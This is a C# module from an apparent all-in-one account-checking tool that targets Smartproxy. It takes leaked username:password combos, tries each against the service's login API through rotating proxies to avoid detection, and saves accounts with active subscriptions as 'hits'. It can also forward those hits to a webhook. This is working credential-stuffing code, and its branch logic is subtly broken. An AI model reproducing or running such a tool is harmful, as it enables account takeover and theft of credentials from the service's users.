using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Smartproxymod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Shopify Mobile/Android/8.26.0 (Build 32571 with API 22 on Samsung SM-N950N)";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("Accept", "application/json, text/plain, */*");
                            var post = "{\"username\":\"" + array[0] + "\",\"password\":\"" + array[1] +
                                       "\",\"type\":\"sp\"}";
                            var text2 = req.Post("https://dashboard.smartproxy.com/api/v1/users/login/", post,
                                "application/json;charset=UTF-8").ToString();
                            var flag7 = text2.Contains("\"has_subscription\":true");
                            var flag8 = text2.Contains("\"has_subscription\":false");
                            if (flag8)

                                if (flag7)
                                {
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Smartproxy_hits", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Smartproxy", array[0] + ":" + array[1]);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "Smartproxy Hits");
                                }
                                else if (flag8)
                                {
                                    Program.Frees++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Smartproxy_frees", array[0] + ":" + array[1]);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintFree("Smartproxy", array[0] + ":" + array[1]);
                                }
                                else
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}